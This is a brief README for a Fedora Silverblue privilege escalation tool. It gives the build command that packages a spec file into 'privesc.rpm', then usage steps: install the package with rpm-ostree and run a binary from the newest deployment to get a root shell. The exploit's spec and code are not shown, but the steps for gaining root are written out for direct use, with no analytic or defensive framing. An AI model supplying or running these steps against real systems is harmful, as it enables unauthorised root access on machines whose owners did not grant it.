A Fedora Silverblue privilege escalation tool that uses `rpm-ostree`.

## Building

**Requirements:** `rpmbuild` (available via `dnf install rpmdevtools`)

```bash
rpmbuild --bb --define "_rpmdir $(pwd)" --define "_rpmfilename privesc.rpm" privesc.spec
```
This generates `privesc.rpm` in the current directory.

## Usage

```bash
rpm-ostree install privesc.rpm
# Enter root shell
"$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)"/usr/bin/privesc
```
